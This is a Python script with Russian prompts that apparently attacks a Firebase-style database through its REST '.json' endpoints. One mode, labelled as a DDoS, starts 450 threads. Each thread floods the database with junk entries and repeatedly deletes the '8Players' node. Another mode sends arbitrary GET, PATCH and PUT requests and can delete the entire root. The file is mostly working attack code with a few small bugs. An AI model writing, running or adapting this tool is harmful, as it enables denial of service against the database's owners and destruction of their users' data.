import requests
import threading
import random

text = ""
symbol = ""
cnt = ""

base = input("Введите url базы данных: ")
print('0 - Ддос базы данных по памяти\n1 - Управление базой данных')
action = int(input('Введите номер желаемого действия: '))

def ddos():
	a=''
	k=0
	while True:
	  if len(a) / 1048576 < 255.0:
	    a = str(random.randint(1000000000,99999999999999)) + ") "+text
	    b = '{"'+text+'":"'+symbol*cnt+'"}'
	    if (k % 10 == 0):
	      responce = requests.delete(base + "/8Players.json")
	      responce = requests.delete(base + "/8Players.json")
	      #responce = requests.delete(base+"/Clans/.json")
	      if responce.status_code == 200:
	        print(str(k)+") Delete Success!")
	      else:
	        print(str(k)+") Error: "+ str(responce.status_code), responce.content)
	    responce = requests.patch(base+"/"+a+".json", b.encode())
	    k+=1
	    if responce.status_code == 200:
	      print(str(k)+") Success!")
	    else:
	      print(str(k)+") Error: "+ str(responce.status_code), responce.content)

if action == 0:
	text = input('Введите текст который будет отображаться в бд при ддосе: ')
	symbol = input('Введите символ которым будет заполняться база данных: ')
	cnt = int(input('Введите количество символов для ддоса в одном запросе: '))
	for i in range(450):
		s1 = threading.Thread(target=ddos)
		s1.start()
	
elif action == 1:
	print('0 - GET\n1 - PATCH\n2 - DEL\n3 - PUT')
	action2 = int(input('Введите номер желаемого типа запроса: '))
	if action2 == 0:
		resp = requests.get(base + "/.json")
		print(resp.text)
	elif action2 == 1:
		head = input('Введите заголовок запроса: ')
		json = input('Введите json запрос: ')
		resp = requests.patch(base+'/'+head+"/.json", json.encode())
		if resp.status_code == 200:
		   print("Success!")
		else:
			print("Error: "+ str(responce.status_code), responce.content)
	elif action2 == 2:
		responce = requests.delete(base+"/.json")
		if responce.status_code == 200:
		   print("Success!")
		else:
			print("Error: "+ str(responce.status_code), responce.content)
	elif action2 == 3:
		head = input('Введите заголовок запроса: ')
		json = input('Введите json запрос: ')
		responce = requests.put(base+'/'+head+"/.json", json.encode())
		if responce.status_code == 200:
			print("Success!")
		else:
	   	 print("Error: "+ str(responce.status_code), responce.content)
	else:
		print('Действие не обозначено!')
else:
	print('Действие не обозначено!')